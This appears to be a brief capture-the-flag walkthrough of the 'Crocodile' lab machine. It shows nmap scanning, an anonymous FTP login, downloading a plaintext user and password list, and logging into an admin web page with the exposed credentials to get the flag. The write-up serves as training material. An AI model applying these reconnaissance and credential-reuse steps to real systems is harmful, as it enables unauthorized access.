![Crocodile.jpg](/assets/Tier-1/Crocodile/crocodile.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.1.15
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.1.15
```

**Output**
```bash
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

3. Web Page and **login.php**
![Crocodile-web.PNG](/assets/Tier-1/Crocodile/crocodile-web.PNG)
![Crocodile-login.PNG](/assets/Tier-1/Crocodile/crocodile-login.PNG)


4. Connect to **ftp** and put **anonymous** how user.
```bash
┌──(root㉿est)-[/home/kali]
└─| ftp 10.129.1.15
Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
Name (10.129.1.15:kali): anonymous
230 Login successful.
```

5. Show all files
```bash
ftp> dir
229 Entering Extended Passive Mode (|||48217|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```

6. Get all files and show the content
```bash
ftp> get allowed.userlist.passwd
ftp> get allowed.userlist
```
---
```bash
┌──(root㉿est)-[/home/kali]
└─| cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                                                                     
┌──(root㉿est)-[/home/kali]
└─| cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

7. Try to login in **login.php**
```
user: admin
password: rKXM59ESxesUFHAd
```
  
![Crocodile-login2.PNG](/assets/Tier-1/Crocodile/crocodile-login2.PNG)

8. **BOOM** Obtain the flag
![Crodile-flag.PNG](/assets/Tier-1/Crocodile/crocodile-flag.PNG)


**By: EsT**